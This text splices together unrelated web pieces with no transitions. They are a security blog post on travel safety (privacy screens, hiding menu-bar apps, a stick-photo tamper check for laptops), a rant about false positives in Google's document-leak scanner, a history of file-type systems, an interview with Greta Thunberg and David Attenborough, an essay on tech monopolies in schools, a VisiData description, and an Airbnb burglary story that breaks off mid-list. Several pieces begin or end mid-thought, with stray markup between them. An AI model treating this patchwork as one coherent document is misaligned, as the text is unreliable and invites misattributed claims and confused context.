<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main id="main-content"><article><img src="https://images.unsplash.com/photo-1517400508447-f8dd518b86db?w=1226&amp;h=400&amp;fit=crop&amp;crop=edges" alt=""><div><section><p>We wrote about <a href="https://security.christmas/2019/21">"Safe travels for the road warrior"</a> last year. This year we offer one more trick, and expand our list for staying safe and secure on the road.</p>
<p>Watch out for shoulder surfers, and protect your equipment if you have to leave it in for example your hotel room.</p>
</section><article><section><p><em>PANDEMIC WARNING: Stay at home if you can. A virus has for the better part of 2020 attacked physical infrastructure (people). We have no patch or hotfix, so while that is being worked out, we advice you to travel as little as possible.</em> </p>
<h2>Shoulder surfers:</h2>
<p>Be aware of your surroundings and reduce the risk of shoulder surfers. A shoulder surfer is someone who is peaking over your shoulder to get information. We can spot people prone to this type of social engineering attack all the time. When people are visiting a cafee, are on public transport, or on air planes they will use their laptop for work stuff. And they don’t notice, or care if someone is looking.</p>
<p>To protect your information, you can, and should invest in a privacy shield for you screen. They cost next to nothing, but reduce/limit the viewing angle of your display.</p>
<p><img src="https://cdn57.androidauthority.net/wp-content/uploads/2019/04/privacy-screen-protector-angle-2.jpg" alt="privacy screen protector"></p>
<p>Reduce the number of apps visible on your computer. On a Mac I recommend that you use <a href="https://www.macbartender.com/">Bartender</a>, but there are Windows and *Nix options as well. The point of this application is that it hides all the running apps from the menu bar, so that it looks like this: </p>
<p><img src="https://i.imgur.com/QsbNjHu.png" alt="a neat menu bar"></p>
<p>rather than this abomination of a menu bar: </p>
<p><img src="https://eshop.macsales.com/blog/wp-content/uploads/2019/05/1password1280.jpg" alt="an untidy and talkative menue bar"></p>
<p>The reason for hiding this information from shoulder surfers is that it reveals many of your attack vector. If someone knows what applications you are running, they know a lot about you. Developer tools, Automator scripts, and a password manager? You presumably work in IT. Bluetooth enabled, an old version of Outlook and a TorrentClient? The bad guys already have tools for these applications.  </p>
<h2>Mikado security</h2>
<p>The other tip is to not leave your computer laying around. This may seem obvious, but there are times when this is impossible. There will be events where you have super secret stuff on your computer, and must step away for a period of time. For instance in a hotel room while you are away for an hour, or go to a resturant.</p>
<p>If an adversary has physical access to your device, they can do all sort of damage. <a href="https://www.theregister.com/2013/12/11/poker_pros_call_shenanigans_over_hotel_malware_infections/">A poker player had this happen to him</a>, where someone broke into his hotel room to install malware on his laptop. This is only one of the cases, but we suspect there are many more based on  the fact that hotel room locks are <a href="https://youtu.be/-Bazy3Ew6D4">ridiculously insecure</a>, and <a href="https://youtu.be/RX-O4XuCW1Y">easy to bypass</a>.<br>
So to combat this problem, we have devised a nice little trick to help you stay safe if you have to leave your device behind.</p>
<p><img src="https://live.staticflickr.com/5475/9350249910_6aeb4b5d85_h.jpg">
<a href="https://flic.kr/p/ffftxm">Mikado</a> by <a href="https://www.flickr.com/photos/kobakpontorg/">Balazs Koren</a>, on Flickr</p>
<p>Mikado (also known as “pick-up sticks game”) is a game where players drop a bundle of sticks as a loose bunch onto a table top. Each player in turn tries to remove a stick from the pile without disturbing any of the others.</p>
<p>MikadoSecurity is where you spread the sticks over the object that you want to protect. You then take a picture of it, and when you return, you can verify that no one has tampered with your device.
In the event that the sticks are not as you left them, you can escalate the problem. Either to do forensics, or discard the computer if you need to.</p>
<p>This trick relies on the same principles as we rely on for computer security. Prime number factoring, traveling salesman problem and SAT are hard to solve if P != NP, but easy to verify.
An example of this is a sudoku board. It is hard for both humans and computers to solve, but if I hand you a board, it is easy for you to verify if I did it correct. </p>

A big source of angst was the amount of “unknown traffic”, things which matched no patterns. Our sales team wanted this less. Our customers wanted it less. Our competitors had less. Why couldn’t we?</p><p>I used to answer this question as follows. “You know, I can put in one bad pattern, that mis-matches, a false positive. The amount of unknown will go down. Will that make it better? I can make 0% unknown right now.”. Interestingly, some would agree with the statement “sure, lets do that”. Some would say “don’t be ridiculous, I want 100% known, and 0% incorrect.”. I would answer the last question as “what if you made your own proprietary protocol, the license-plate protocol. You, and only you use it. The data in the stream is ciphered from your license plate. Would you expect a pattern for that?”. They would usually say no, I would then point out that 0% unknown as a false goal, the real goal was 0% incorrectly known and as much known as feasible. Still didn’t stop the competitor from using weak false positives to get to higher <code>known</code> amount.</p><p>Yesterday I received an email from the good people at Google. They are launching a new document leakage tool. It scans your shared documents for sensitive things (emails, medical, that sort of thing). Mine is below. Its alarming. 7% of my shared files contain sensitive information! O no!</p><div><figure><img loading="lazy" width="1024" height="624" src="https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-1024x624.png" alt="" srcset="https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-1024x624.png 1024w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-300x183.png 300w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-768x468.png 768w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-100x61.png 100w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-150x91.png 150w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-200x122.png 200w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-450x274.png 450w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-600x366.png 600w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-900x549.png 900w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2.png 1158w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-1024x624.png" data-lazy-srcset="https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-1024x624.png 1024w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-300x183.png 300w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-768x468.png 768w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-100x61.png 100w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-150x91.png 150w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-200x122.png 200w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-450x274.png 450w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-600x366.png 600w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2-900x549.png 900w, https://blog.donbowman.ca/wp-content/uploads/2020/12/image-2.png 1158w"></figure></div><p>But then I started reading… Its the same pattern match technology.

You get a number: “9% of your documents shared have Global Gender Identity”. What does that even mean?</p><p>This is how you make data untrustworthy and less than useless. I spent time trying to figure out what the call to action was. Eventually I realised the call to action was to ignore: someone at Google has written a few bad regex. They’ve run them on my documents. They’ve shared the categories and counts, but not the links. Their false positive engine cost me time and adds nothing to the universe.</p><p>Sadly, I think there are people out there buying pattern engines for all sorts of things, and, pushing towards the false goal of 0% unknown. It must match, right? Wrong.</p></div></div></article></div>]]>

<p>Corrections added to the Creator/Type code section thanks to user "Somebody" on Hacker News</p>

<p>Suppose you double-click on a file on your computer. You're doing this so you can open the file and work with it. But does your operating system know what that means? How does it know <em>what</em> to open the file <em>in</em>? Let's look at some solutions that have been proposed over the years to solving this issue.</p>
<p>(fun fact: this originally started as a touchup of <a href="https://invisibleup.com/articles/2/">one of my oldest articles</a> before just kinda becoming this whole <em>thing</em>, so expect a bit of retreading.)</p>
<h2>Nothing</h2>
<p><img alt="IBM 709 in use" src="https://invisibleup.com/articles/34/IBM709.jpg"></p>
<p><strong>Used in</strong>: Early mainframes such as the <a href="https://en.wikipedia.org/wiki/IBM_704">IBM 704</a>, etc.</p>
<p>(Image credit: <a href="https://www.computer-history.info/Page4.dir/pages/IBM.704.dir/">Lawrence Livermore National Laboratory</a>)</p>
<p>What's a "file", anyways? It's a sequence of bytes on a disk, possibly floppy. Or a tape. (Cassette or paper, your choice.) Or on stacks of cards with holes in them. Or toggled in by hand on a front panel.</p>
<p>File types weren't relevant because <em>files</em> weren't really a thing. In the mainframe era, you typically 
1. loaded a program on to your computer from punch cards or a tape
2. fed input into that program either from a teletype terminal or from a different tape/card deck
3. received output from the teletype, a line printer, or yet another tape/card deck</p>
<p>Computers weren't complicated enough where there was any confusion as to what a file on a certain medium <em>was</em>, simply because there was so little to work with. If you had a stack of punchcards, that was your "file". Hope you labeled the box you put it in!</p>
<p>Tapes are more interesting, because they hold substantially more data. (A whopping 5.76 megabytes, stored on 3/4 of a kilometer of magentic tape. How exciting!) That said, storing more than one file on a tape was a strange task. Operating systems weren't really a <em>thing</em> yet. The best that existed were programming languages such as FORTRAN or COBOL that had statements for hardware tasks such as reading from or writing to a tape or punch card. For example, <a href="http://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf">here's the manual for FORTRAN for the IBM 704.</a> We have several commands such as <code>READ</code> (from the punch card reader), <code>READ TAPE</code>, <code>PUNCH</code> (new cards), <code>PRINT</code> (to the printer), etc.</p>
<p>On the IBM tape units of the time (ex: the <a href="https://en.wikipedia.org/wiki/IBM_727">IBM 727</a>), tapes were separated into <em>files</em> and <em>records</em>. In FORTRAN, records were created on every <code>WRITE TAPE</code> command, and could be read with <code>READ TAPE</code> later. Records could be overwritten by using the <code>BACKSPACE</code> statement and then writing again. Files were collections of records, and could be created with an <code>END FILE</code> command.</p>
<p>As an aside, later programming languages such as C still share their heritage from this era. This is why we draw text to the screen with <a href="http://www.cplusplus.com/reference/cstdio/printf/"><code>printf</code></a> which long ago would have literally printed to a <a href="https://en.wikipedia.org/wiki/Teletype_Model_33">teletype terminal</a>, why we read files using <a href="http://www.cplusplus.com/reference/cstdio/rewind/"><code>rewind</code></a>, <a href="http://www.cplusplus.com/reference/cstdio/fseek/"><code>fseek</code></a>, <a href="http://www.cplusplus.com/reference/cstdio/fread/"><code>fread</code></a>, and <a href="http://www.cplusplus.com/reference/cstdio/fwrite/"><code>fwrite</code></a> as if we were on a tape drive still. Even <a href="http://www.asciitable.com/">ASCII</a>, the encoding most commonly used for the basic Latin alphabet, has code points for file, group, record, and unit separators. (This may also be related to block terminals, something that will be discussed in a future article.)</p>
<p>As mainframes moved onto more advanced batch processing and later interactive time-share operating systems like UNIX, <a href="https://en.wikipedia.org/wiki/OS/360_and_successors">OS/360</a>, <a href="https://en.wikipedia.org/wiki/Michigan_Terminal_System">Michigan Terminal System</a>, <a href="https://en.wikipedia.org/wiki/Incompatible_Timesharing_System">ITS</a>, etc., they gained more sophisticated methods of dealing with files than raw tape drive access. But then came the microcomputers.</p>
<h2>Type Codes</h2>
<p><img alt="Apple DOS file listing" src="https://invisibleup.com/articles/34/appledos.gif"></p>
<p><strong>Used in</strong>: <a href="https://en.wikipedia.org/wiki/Apple_DOS">Apple DOS for Apple II</a> (1978-1980), <a href="https://www.hpmuseum.org/hp28c.htm">HP-28</a> and <a href="https://www.hpmuseum.org/hp48s.htm">HP-48</a> series, etc.</p>
<p>We have floppy disks now. They can store a lot of files, rename them, delete them, etc. without too much issue. There's this neat computer called the Apple II that just came out. It uses these new-fangled disks, so it needs to figure out how to store files on it.</p>
<p>The way that Apple DOS (the Apple II's disk operating system for most of it's life) stored files is somewhat interesting. Each file has a name (up to 30 characters) and also a <em>type code</em>. 8 of them were defined but only 4 of them mattered:</p>
<ul>
<li>I (Integer BASIC program)</li>
<li>A (Applesoft BASIC program)</li>
<li>B (Binary files; either assembled programs or data)</li>
<li>T (ASCII text files)</li>
</ul>
<p>Apple DOS had some specific commands that interacted with these types. For instance, the <code>RUN</code> command worked on both Interger BASIC and Applesoft BASIC programs, and chose which one to use. <code>BRUN</code>, <em>binary run</em>, only worked on binary files. <code>OPEN</code>, <code>READ</code>, <code>WRITE</code>, and <code>CLOSE</code> all worked only on ASCII text files.</p>
<p><strong>The types more served as a way to help the operating system more so than you.</strong> This is especially evident in the late 80's and early 90's HP calculators such as the HP-28c and the HP-48GX. These calculators didn't have disks, but they did have persistent memory that could store objects into folders much like a computer.</p>
<p>These calculators used Reverse Polish Notation. Essentially, you do math by placing objects on the stack and then executing commands, which take things from the stack and put a new thing on. An <em>object</em> in RPN is something you placed on the stack. The HP-48's Advanced User's Reference Manual lists 32 distinct types, including real numbers, complex numbers, character strings, arrays, lists, variable names, executable programs, graphics objects, directories, etc. A <em>command</em> could be, say, <code>ADD</code> or some fancy plotting calculus stuff. Whatever they were, they needed to know what types they were dealing with so that they could either reject the input or properly work with it.</p>
<p>Like the Apple II, just having an integer for a type is perfectly okay because the types don't serve the user. They're just there so the operating system knows what a given chunk of bytes on the stack <em>is</em>. There are a few reserved spots for custom types, but for the most parts new types aren't expected to ever be added, nor should they be.</p>
<h3>File Extensions</h3>
<p><img alt="CP/M disk listing as seen on an Amstrad CPC" src="https://invisibleup.com/articles/34/cpm.gif"></p>
<p><strong>Used in</strong>: AMSDOS (Amstrad CPC), CP/M, MS-DOS, etc.</p>
<p>Microcomputers really started to gain in popularity with the likes of the ZX Spectrum, the Amstrad CPC and the Commodore 64 among others. These were fairly cheap and simple computers. When first launched, these came with nothing but cassette tape inputs, as disks were too expensive.</p>
<p>On these computers, you'd attach a cassette player using a standard AUX cord (although some, like the CPC, had a cassette player built in), and the computer would instruct you when to start and stop the tape. These cassette players usually came with a little counter that rolled up as the tape progressed, to help you tell where the tape was. When you insert a tape, you reset the counter to zero. When you want to <em>make</em> a file, you'd write down what the counter read, then save the file. To <em>load a specific file</em>, you'd seek the tape until you're at the location you've written down, then start reading.</p>
<p>More advanced computers such as the Amstrad CPC instead saved <a href="http://www.cpcwiki.eu/index.php/AMSDOS_Header">a header</a> with each file containing, among other things, a file name and extension. If asked for a specific file it could just read the tape until it found it. Later these computers gained disk drives, and any ad-hoc tape fiddling was replaced with a proper file system such as <a href="https://en.wikipedia.org/wiki/File_Allocation_Table">FAT</a> or <a href="https://en.wikipedia.org/wiki/Macintosh_File_System">MFS</a> that stored <em>where</em> a file was on a given disk and <em>what is was called</em>.</p>
<p>File codes are limited. It is nigh-on impossible to add more ones. What you have is what you got. So... what if we just made the codes out of letters? A couple of them? And they could be anything. Then programmers could come up with whatever file extensions they want and that's okay.</p>
<p>Suppose, in MS-DOS, you have a file named <code>REPORT.TXT</code>. <code>REPORT</code> is the file name, <code>TXT</code> is the extension. <strong>File extensions give an easy, consistent indicator of what a file contains.</strong> A <code>TXT</code> file contains text, a <code>BMP</code> file is a bitmap, etc. </p>
<p>Some file extensions, like <code>EXE</code>, <code>BAT</code>, <code>SYS</code> and <code>COM</code> had special meaning much in the same way that the Apple DOS codes had special meanings, but other than that they're just there to help the user. <strong>The user had to manually choose which program to use.</strong> This allowed for the user to choose what view or editor to use depending on what would be the most helpful. Unfortunately, there were no default programs. If the user didn't know which program, say, a <code>VIZ</code> file is for, they're out of luck. Is it a visualization? Some manga thing? The digital manifestation of a cute internet ghost who's staying up way too late geeking out about old computers? <em>The world may never know...</em></p>
<h3>Creator Codes</h3>
<p><strong>Used in:</strong> Classic Mac OS</p>
<p><img alt="File properties dialog on Classic Mac OS" src="https://invisibleup.com/articles/34/macinfo.gif"></p>
<p>Let's hop on over to the Macintosh for a quick second. It was a newfangled thing in 1984, and it had the opportunity to reinvent the wheel and break compatibility with CP/M and mainframe traditions. And so it did.</p>
<p>The original 128K Macintosh used 400K floppy disks, a not-completely-terrible amount of space for the time. It used the <a href="https://en.wikipedia.org/wiki/Macintosh_File_System">MFS</a>, which didn't support directories but <em>did</em> support files. It was also completely graphically driven. The Finder was supposed to be the primary way of interacting with files, and the <code>File &gt; Open</code> command could launch the program that made the file. How'd it do that?</p>
<p><strong>Instead of file extensions, the Macintosh used type and creator codes</strong>. These were 4-byte identifiers, much like file extensions, but there were two of them each with a different meaning. The type code was mean to represent the format the data was stored in, used to filter files in the Finder's "Open" dialog. The creator code was meant to indicate the application that created the file, and used by the Finder to choose which specific application to launch. Now, these weren't normally visible to the user. They just saw the file name and a icon for that type.</p>
<p>To do that, the system kept a database of codes and their associated icons and programs. When ran for the first time or moved from disk to disk, <strong>the Finder would read the program data and register in a database what creator codes and file types it supported.</strong> The Finder would then save this information on the disk containing the application. Later, <strong>when the user opened a file, the OS would check its type and creator code against its stored list to determine which application to use.</strong> This worked pretty well.</p>

      <p>All is quiet at Greta Thunberg's home on Kungsholmen in Stockholm. On this day one year ago she was at sea, on a catamaran in the middle of the Atlantic Ocean. Now she has just come home from school. Labrador Roxy is asleep on the couch, and Moses, the golden retriever, has crashed out on the floor. A thousand-piece jigsaw puzzle is spread out over the kitchen table on which Greta lays edge pieces while waiting for Sir David to appear on the computer monitor.</p>
        
    
  
    

        
    
  
    

      <p><strong>This fall, she is the main character</strong> in Nathan Grossman's feature film Greta. He has recently released the film and the book A Life on our Planet.</p>
      <p>In the introduction to the film, Sir David says:</p>
      <p>”The natural world is disappearing. The evidence is all around us, it is happened in my lifetime. I have seen it with my own eyes.”</p>
      <p>The story starts in 1937, the year he turned 11.</p>
      <p>Then: Wilderness on 66 percent of the Earth, a carbon dioxide levels in the atmosphere of 280 ppm.</p>
      <p>And now? Wilderness on 35 percent of the Earth, a carbon dioxide levels in the atmosphere of 415 ppm.</p>
      <p>Just like climate change and the <a href="https://www.weforum.org/agenda/2020/11/covid-19-pandemics-nature-scientists/">ongoing pandemic</a>, the loss of biodiversity is part of a major sustainability crisis caused by humans.</p>

      <p><strong>The computer pings</strong>, and Gretas kitchen is filled with a familiar voice coming from the speakers. A voice usually accompanied by pictures of vast savannas, colorful coral reefs and mighty animals cheerfully says:</p>
      <p>”Hello, Greta!”</p>
        
    
  
    

        
    
  
    

      <p>DN's Head of Culture Björn Wiman leads the conversation by link from home.</p>
      <p><strong>Björn Wiman: ”Sir David, how is life for you during the pandemic?”</strong></p>
      <p><strong>David Attenborough:</strong> ”Well, it is not so bad. I am lucky to have a garden. It is not a big garden, but it is a garden, and it has a pond. I get food delivered once a week. And I have a lot to do: I can write here and I record, doing my voiceovers while watching the programs on a screen. So I have been pretty active... I have not actually left the house in eight and a half months, which is extraordinary. But I cannot complain.”</p>
      <p><strong>”Greta, I know that films and documentaries like the ones Sir David has made were what got you interested in this subject from the start.”</strong></p>
      <p><strong>Greta Thunberg:</strong> ”Yes, that is right. It was by watching documentaries and films that I was introduced to the climate crisis and the environmental crisis. That is how I learned and linked the facts to start with. It was a big eye-opener for me.”</p>

      <p><strong>”This conversation is about two parts of the same major crisis: Climate change and the mass extinction of other species on Earth. My impression is that the climate crisis sometimes takes up a disproportionate amount of space and that too little attention is focused on the interaction between these two crises. Do you agree?”</strong></p>
      <p><strong>GT:</strong> ”These crises are interconnected. We cannot communicate one crisis without communicating the other. Unfortunately, the media today works in such a way that we want simple and click-friendly headlines. That can make it difficult to explain complex issues, and this is a very complicated issue. We need to connect the information: This is not one crisis, it is not two or three separate crises. This is a symptom of a much bigger issue.”</p>

      <p><strong>”Do you think, Greta, that there is too much focus on the ”nature side” of this issue – and too little on the consequences for human civilization and the future of humanity?”</strong></p>
      <p><strong>GT:</strong> ”No, I do not think there is too much focus on nature. I think there is too little focus on nature.”</p>
      <p><strong>DA:</strong> ”Yes, that is right.”</p>
      <p><strong>GT:</strong> ”There is too little focus on all aspects of this crisis.”</p>
        
  
  

      <p><strong>”Does that also apply to the ”solution side” of this problem? You sometimes hear ‘the solution can be found in new technological systems’ or ‘the solution is that we change our way of life’.”</strong></p>
      <p><strong>DA:</strong> ”There is not one single solution. There are a number of different solutions because there are a lot of problems. Fishing has a set of problems, carbon dioxide emissions have different problems, the way we treat agricultural land. The fuel and energy industries have their own challenges. So there is not just one miraculous action that allows us to say, ‘Right, bingo, there we have it! We have resolved the issue.’ It is not like that! There are millions of issues.”</p>
      <p><strong>GT:</strong> ”Exactly. Sometimes it feels like we are wasting the little time we have now by arguing about what solution is best. ‘We shouldn not be doing this because this is better.’ As if we had a choice! As if we can decide for ourselves what we need to do, and as if there is one magical solution that will fix everything. We need to get away from that narrative, we need to leave that idea behind us.”</p>
      <p><strong>DA:</strong> ”Yes, I agree. And at the end of the day, you know, it is a big world. The only thing we can do – what you, Greta, are particularly good at – is to ensure that people around the world see what the problem is. We have to be persistent, and we have to make sure there is a large democratic multitude of voices saying 'do something, do something, do something'. We have to keep that choir alive, or those with power will not react. But even when they do react, it is extremely difficult to reach agreement on how we should treat the oceans or the atmosphere.”</p>
      <p><strong>GT:</strong> ”Yes. For a crisis as complex as this one, which we do not fully understand – for there will always be things we are unaware of – we must bring together all the experts. We have to deal with the crisis as a crisis and work together from there. We cannot expect to have all the answers delivered to us, for someone to say, ‘This is what we need to do. This is going to solve the problem.’ We have to find the answers along the way.”</p>

      <p><strong>GT:</strong> ”I think we simply need to tell the truth. We should be adult enough to handle the truth. And the truth can be quite frightening in some ways – but it is also hopeful. There is hope. And we should simply communicate the truth to get the whole picture.”</p>
      <p><strong>DA:</strong> ”Yes. And we cannot expect it to happen overnight, or in a year, or even in a decade. That we are going to solve all the problems. But there have been major changes already... I remember that ten years ago it was considered strange to invest in wind power and solar panels. But it actually happened! And veganism – you are a vegan, Greta – I mean: It has happened! So changes are happening, they are not sufficient, and they are not dramatic enough, but... We all move in our own circles, so it is hard to generalize. But in my circles I meet far more people who understand the problems now, far more people who do what they can in their own lives.”</p>

It is a great privilege to speak with President Obama, for example, and those I have met have treated me very politely. But I cannot tell if they are knowledgeable or not. I mean, they say the right things. They say, ‘Yes, we agree’ and ‘We are going to do something’. But they are politicians, they are not going to commit to anything when they are being filmed. At least they have not done so in front of me. Maybe they have said something to Greta?”</p>

<p><strong>Monopoly Technology Platforms are Colonizing Education</strong></p>
<p><strong>By Larry Kuehn</strong></p>
<p>The exposés of abuse by social media corporations like Google and Facebook have finally brought attention to the dangers of monopolies over our communications. The way these monopolies have been colonizing public education has, however, gone almost unnoticed. This is rampant privatization sneaking in as essential to “21<sup>st</sup> Century learning.”</p>
<p>The top five global capital corporations are technology platforms—Apple, Google, Microsoft, Amazon and Facebook. Platforms are a host for a variety of services and uses. All of the big five platform corporations have become too large in a short period of time to have any significant competition outside of this group. They compete against one another, adding services to secure their monopoly by offering users everything they do online.</p>
<p>If a new service is developed that seems to be gaining users, or that competes with an element of their platform, it is purchased and integrated into the platform—avoiding new competitors. Alternatively, they use their massive resources to develop a comparable app and push the potential competitor aside.</p>
<p>Snicek, in <a href="https://www.wiley.com/en-us/Platform+Capitalism-p-9781509504862"><em>Platform Capitalism</em></a>, points out that the development of these monopolies “introduces new tendencies within capitalism that pose significant challenges to a post-capitalist future.” Building public cooperative platforms becomes an impossible dream.</p>
<p>No surprise—these platforms have moved to colonize education. Public education represents a big chunk of potential revenue. Just as importantly, schools are where one can find most of the future potential consumers and users of the platform services.</p>
<p>Colonization is a process where a significant force moves into an area and dominates. It takes over not only the production and resources, but imposes—often by stealth and power—the processes and approaches and even values of the social and cultural environment. And, dominate is what the monopoly platforms are on track to do in public education.</p>
<p><img src="http://instituteforpubliceducation.org/wp-content/uploads/2019/01/G-Suite-For-Education-400x200.png" alt="" width="262" height="131" srcset="https://instituteforpubliceducation.org/wp-content/uploads/2019/01/G-Suite-For-Education-400x200.png 400w, https://instituteforpubliceducation.org/wp-content/uploads/2019/01/G-Suite-For-Education-768x384.png 768w, https://instituteforpubliceducation.org/wp-content/uploads/2019/01/G-Suite-For-Education.png 800w" sizes="(max-width: 262px) 100vw, 262px">The most successful colonizer has been Google. A recent report indicates that Google’s <em>G-Suite for Education</em> is being used by half the teachers and students in the U.S. Canada is fast approaching the same level of use. It includes a range of free software tools that can be used by students and teachers—word processing, presentations, spread sheets and the like. G-Suite incorporates “Classroom,” an integrated learning management system that keeps track of grades, attendance and more. And, of course, YouTube is linked to student use.</p>
<p>New elements are added frequently. “Google Sites” is promoted for student e-portfolios, because “every student should publish for the world.” Google acquired Workbench, integrated with Google Classroom to give “lessons connected to a variety of ‘maker’ activities focused on STEM.” It is part of Google’s plan to “help schools and educators address their universal needs around education content.”</p>
<p>Google, rather than democratic public institutions, therefore shapes what is on offer. Google’s position as colonizer is strengthened by the hardware increasingly used in schools—the Google Chromebook. <img src="http://instituteforpubliceducation.org/wp-content/uploads/2019/01/CB_canada.max-1000x1000-400x222.png" alt="" width="346" height="192" srcset="https://instituteforpubliceducation.org/wp-content/uploads/2019/01/CB_canada.max-1000x1000-400x222.png 400w, https://instituteforpubliceducation.org/wp-content/uploads/2019/01/CB_canada.max-1000x1000-768x425.png 768w, https://instituteforpubliceducation.org/wp-content/uploads/2019/01/CB_canada.max-1000x1000.png 1000w" sizes="(max-width: 346px) 100vw, 346px">It is less expensive than other computers because much of what it needs to operate is supplied by Google in the cloud—operating software, applications and memory. No need to build those into the computer.&nbsp; According to market reports, Chromebooks make up the majority of all computers sold to schools in the U.S. and are marketed globally.</p>
<p>However, one must have a gmail account to use these Google tools—so if a parent wants to protect the privacy of their child and refuses a gmail account that kid is left out while the rest of the class works away on their Chromebook and other Google tools. (See <a href="http://s3.documentcloud.org/documents/4497822/GAFE-Information-Letter-and-Consent-Form-page2.pdf">here</a> the kind of consent form parents are asked to sign, giving Google access to acquire and store student information outside of Canada.)</p>
<p><img src="http://instituteforpubliceducation.org/wp-content/uploads/2019/01/Screen-Shot-2018-12-31-at-4.20.52-PM-400x70.png" alt="" width="657" height="115" srcset="https://instituteforpubliceducation.org/wp-content/uploads/2019/01/Screen-Shot-2018-12-31-at-4.20.52-PM-400x70.png 400w, https://instituteforpubliceducation.org/wp-content/uploads/2019/01/Screen-Shot-2018-12-31-at-4.20.52-PM-768x135.png 768w, https://instituteforpubliceducation.org/wp-content/uploads/2019/01/Screen-Shot-2018-12-31-at-4.20.52-PM-1024x180.png 1024w, https://instituteforpubliceducation.org/wp-content/uploads/2019/01/Screen-Shot-2018-12-31-at-4.20.52-PM.png 1238w" sizes="(max-width: 657px) 100vw, 657px"></p>
<p>Google has even taken up teaching “internet safety,” with a program aimed at reaching 5 million students. Its core is a game for students in Grades three to six to teach them to avoid “schemers, hackers and other bad actors.” However, as critics point out, it doesn’t talk about privacy concerns when users’ personal information and actions are tracked online. Google conveniently ignores its role as a “bad actor.”</p>
<p>A <a href="https://journals.sagepub.com/doi/abs/10.1177/1474904116654917">Swedish study </a>of Google’s strategy concluded that “By making an implicit demarcation between two concepts (your) ‘data’ and (collected) ‘information’ Google can disguise the presence of a business model for online marketing and, at the same time, simulate the practices and ethics of a free public service institution.”</p>
<p>In “<a href="http://2017trends.hackeducation.com/data.html">The Weaponization of Education Data</a>,” Audrey Watters points out “the risk isn’t only hacking.&nbsp; It’s amassing data in the first place. It’s profiling. It’s tracking. It’s surveilling.”</p>
<p>Google isn’t alone in the business of colonizing education and student data—just the most successful so far. One competitor is Microsoft 365 Education, with a promise of “empowering every student on the planet to achieve more” and that it will “unlock limitless learning.”</p>
<p>It’s not an accident that it is “Microsoft 365” that is being pushed. It offers a cloud-based software and cloud storage for your work. It is the new business model for Microsoft: they don’t sell you software, you rent it—and you keep paying for it. And your work isn’t saved on your own computer, so you have to keep up your subscription. Like Google, they are hoping that students will keep using their tools when they finish being students.</p>
<p>Microsoft is imitating much of what Google offers, but by charging for the service rather than trading it for data. It offers apps, educator training and STEM lessons “to enrich science, technology, engineering and math classes.” They offer “budget friendly” Windows 10 devices with licences for Microsoft 365 Education.</p>
<p>The other major tech corporations have programs as well. Apple, for example, was the first into education with the Apple IIe and the “Apple Classroom of Tomorrow” way back in the 1980s. More recently it depended on the ease of use of the iPad, despite its cost, to sell classroom sets along with Pearson curriculum in an <a href="https://www.wired.com/2015/05/los-angeles-edtech/">ill-fated project with Los Angeles schools</a>.</p>
<p>Venture capitalists are hoping to find the magic app that will make a fortune. The potential market is indicated by expenditure of hundreds of millions each year on developing new products. The “winners” are likely to be bought up by one of the major corporations—or find their product idea taken by the monopolies.</p>
<p>Not enough attention is paid by education authorities or researchers to the shaping and distortion of education that is possible—even likely—by this colonization of education by technology monopolies.</p>

<span>DESCRIPTION</span>              
     <span>VisiData</span> is an easy-to-use multipurpose tool to explore, clean, edit, and restructure          
     data. Rows can be selected, filtered, and grouped; columns can be rearranged, trans-           
     formed, and derived via regex or Python expressions; and workflows can be saved, doc-          
     umented, and replayed.

<p>I used <a href="https://www.airbnb.com/">Airbnb</a> for years in Russia, Germany, and the United States. All the time, the experience was great. At some point, I read a <a href="https://amzn.to/3o9JywH">book about Airbnb</a> to understand the company better.</p>

<p>For Thanksgiving week (November 21-29), five of my friends and I rented a house in Las Vegas.</p>

<p>The total price for nine days: <strong>$2543</strong>.</p>

<p>Previously people went to Vegas to spend time in casinos or walk on The Strip. This year, <a href="https://www.worldometers.info/coronavirus/">the pandemic</a> made it impossible.</p>

<p>It was not a problem for us. We did not plan to socialize; we were going rock climbing.</p>

<p><a href="https://www.mountainproject.com/area/105731932/red-rock">Red Rocks</a>, located next to Vegas, is an excellent place for traditional, sport, bouldering, multi-pitch climbing.</p>

<p>The plan was for some people to take days off and climb every day, and for others to work three days remotely and join the gang during the rest.</p>

<h2 id="incident">Incident</h2>

<p>We moved in on Saturday night. The next morning, excited, we woke up at 6am, had breakfast, verified that we closed back and front doors and at 7am drove to the Red Rocks Park.</p>

<p>We had a fantastic day of climbing, but after the sunset, we went home to realize that the window in one of the rooms was open and some of our belongings had disappeared.</p>

<ul>
  <li>Three work Macbook Pro (I do not include the price, they are replaced by our employees for free)</li>
  <li>One personal <a href="https://amzn.to/33uWB3F">Macbook Pro</a> ($1550)</li>
  <li><a href="https://amzn.to/2JCZWqE">Oculus Quest 2</a>. I just bought it. Really cool. Wanted to share the experience. ($399)</li>
  <li><a href="https://amzn.to/2VnyrUt">GoPro Hero 6</a> ($194)</li>
  <li><a href="https://amzn.to/36oMMGz">Lenovo Tab 4, 10.1in Android Tablet</a> ($190)</li>
